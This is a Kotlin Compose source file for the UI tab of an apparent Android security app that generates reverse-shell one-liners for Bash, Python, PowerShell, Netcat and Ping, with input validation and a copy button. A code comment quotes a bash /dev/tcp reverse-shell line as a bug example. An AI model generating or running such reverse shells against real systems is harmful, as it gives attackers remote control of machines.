package com.example.ui.payloads

import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.ExperimentalLayoutApi
import androidx.compose.foundation.layout.FlowRow
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Code
import androidx.compose.material.icons.filled.NetworkCheck
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Terminal
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.remember
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.R
import com.example.payloads.HostValidation
import com.example.payloads.PayloadEnvironment
import com.example.payloads.PayloadGenerator
import com.example.payloads.PortValidation
import com.example.ui.components.CyberBadge
import com.example.ui.components.CyberChoiceChip
import com.example.ui.components.CyberCopyButton
import com.example.ui.components.CyberMessage
import com.example.ui.components.CyberSectionLabel
import com.example.ui.components.CyberTerminalBox
import com.example.ui.components.CyberTextField
import com.example.ui.theme.LocalCyberPalette

/**
 * Tab 4 - reverse-shell one-liner generator.
 *
 * ### What changed
 *  - host and port are validated. The previous version accepted anything and
 *    happily emitted `bash -i >& /dev/tcp/hello world/999999 0>&1`, which is a
 *    template nobody can use, with no indication of why;
 *  - `Netcat` and `Ping` are now both reachable. `Netcat` existed in the
 *    generator but the chip row only offered four entries and `Ping` was
 *    unreachable dead code in the `else` branch;
 *  - the environment set is driven by [PayloadEnvironment.entries], so adding a
 *    shell automatically adds a chip.
 */
@OptIn(ExperimentalLayoutApi::class)
@Composable
fun PayloadsTabScreen(
  host: String,
  onHostChange: (String) -> Unit,
  port: String,
  onPortChange: (String) -> Unit,
  environmentKey: String,
  onEnvironmentChange: (String) -> Unit
) {
  val palette = LocalCyberPalette.current
  val environment = remember(environmentKey) { PayloadEnvironment.fromKey(environmentKey) }

  val hostValidation = remember(host) { PayloadGenerator.validateHost(host) }
  val portValidation = remember(port) { PayloadGenerator.validatePort(port) }

  val hostError = when (hostValidation) {
    HostValidation.Valid -> null
    HostValidation.Empty -> stringResource(R.string.payload_host_error_empty)
    HostValidation.Invalid -> stringResource(R.string.payload_host_error_invalid)
  }
  val portError = when (portValidation) {
    PortValidation.Valid -> null
    PortValidation.Empty -> stringResource(R.string.payload_port_error_empty)
    is PortValidation.OutOfRange -> stringResource(R.string.payload_port_error_range)
  }

  val payloadText = remember(host, port, environment) {
    PayloadGenerator.generate(environment, host, port)
  }
  val isTemplate = hostValidation is HostValidation.Empty || portValidation is PortValidation.Empty

  Column(
    modifier = Modifier
      .fillMaxSize()
      .verticalScroll(rememberScrollState())
      .testTag("payloads_tab"),
    verticalArrangement = Arrangement.spacedBy(14.dp)
  ) {
    Column(verticalArrangement = Arrangement.spacedBy(10.dp)) {
      CyberSectionLabel(
        icon = Icons.Default.NetworkCheck,
        label = stringResource(R.string.payload_connection_label)
      )

      Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.spacedBy(10.dp)
      ) {
        CyberTextField(
          value = host,
          onValueChange = onHostChange,
          label = stringResource(R.string.payload_host_label),
          modifier = Modifier.weight(1.5f),
          isError = hostValidation is HostValidation.Invalid,
          testTag = "payload_host"
        )
        CyberTextField(
          value = port,
          onValueChange = { typed -> onPortChange(typed.filter { it.isDigit() }.take(5)) },
          label = stringResource(R.string.payload_port_label),
          modifier = Modifier.weight(1f),
          keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
          isError = portValidation is PortValidation.OutOfRange,
          testTag = "payload_port"
        )
      }

      if (hostError != null) {
        CyberMessage(message = hostError, isError = true)
      }
      if (portError != null) {
        CyberMessage(message = portError, isError = true)
      }
    }

    Column {
      CyberSectionLabel(
        icon = Icons.Default.Code,
        label = stringResource(R.string.payload_environment_label)
      )
      // Wraps instead of scrolling: five chips on a 384dp screen hid the last two
      // off the right edge with no scroll affordance, so PowerShell looked absent.
      FlowRow(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.spacedBy(8.dp),
        verticalArrangement = Arrangement.spacedBy(4.dp)
      ) {
        PayloadEnvironment.entries.forEach { candidate ->
          CyberChoiceChip(
            label = candidate.label,
            isSelected = candidate == environment,
            onClick = { onEnvironmentChange(candidate.key) }
          )
        }
      }
    }

    Column {
      CyberSectionLabel(
        icon = Icons.Default.Terminal,
        label = stringResource(R.string.payload_generated_label),
        trailing = {
          Row(verticalAlignment = Alignment.CenterVertically) {
            CyberBadge(
              label = if (isTemplate) "TEMPLATE" else stringResource(R.string.payload_ready),
              tint = if (isTemplate) palette.mutedForeground else palette.primary
            )
            Spacer(Modifier.width(8.dp))
            CyberCopyButton(textToCopy = payloadText)
          }
        }
      )
      CyberTerminalBox(
        content = "root@target:~# $payloadText",
        minHeight = 150
      )
      if (isTemplate) {
        Spacer(Modifier.height(10.dp))
        CyberMessage(
          message = stringResource(R.string.payload_template_hint),
          isError = false
        )
      }
    }

    Card(
      modifier = Modifier.fillMaxWidth(),
      colors = CardDefaults.cardColors(containerColor = palette.surface),
      shape = RoundedCornerShape(12.dp),
      border = BorderStroke(1.dp, palette.border)
    ) {
      Column(
        modifier = Modifier.padding(14.dp),
        verticalArrangement = Arrangement.spacedBy(8.dp)
      ) {
        Row(verticalAlignment = Alignment.CenterVertically) {
          Icon(
            Icons.Default.Security,
            contentDescription = null,
            tint = palette.primary,
            modifier = Modifier.size(22.dp)
          )
          Spacer(Modifier.width(10.dp))
          Text(
            text = stringResource(R.string.payload_purpose_title),
            color = palette.primary,
            fontSize = 13.sp,
            fontWeight = FontWeight.Bold
          )
        }
        Text(
          text = stringResource(R.string.payload_purpose_body),
          color = palette.mutedForeground,
          fontSize = 12.5.sp,
          fontWeight = FontWeight.Medium
        )
        Spacer(Modifier.height(2.dp))
        Text(
          text = stringResource(R.string.payload_current_label),
          color = palette.foreground,
          fontSize = 12.sp,
          fontWeight = FontWeight.Bold
        )
        Text(
          text = stringResource(environment.explanationRes),
          color = palette.mutedForeground,
          fontSize = 12.5.sp,
          fontWeight = FontWeight.Medium
        )
        Spacer(Modifier.height(2.dp))
        Text(
          text = stringResource(R.string.payload_order_hint),
          color = palette.foreground,
          fontSize = 12.5.sp,
          fontWeight = FontWeight.Medium
        )
        Spacer(Modifier.height(2.dp))
        Text(
          text = stringResource(R.string.payload_disclaimer),
          color = palette.mutedForeground,
          fontSize = 12.sp,
          fontWeight = FontWeight.Medium
        )
      }
    }
  }
}

/** Per-environment explanation, so the form is never a mystery box. */
private val PayloadEnvironment.explanationRes: Int
  get() = when (this) {
    PayloadEnvironment.BASH -> R.string.payload_explain_bash
    PayloadEnvironment.PYTHON -> R.string.payload_explain_python
    PayloadEnvironment.POWERSHELL -> R.string.payload_explain_powershell
    PayloadEnvironment.NETCAT -> R.string.payload_explain_netcat
    PayloadEnvironment.PING -> R.string.payload_explain_ping
  }
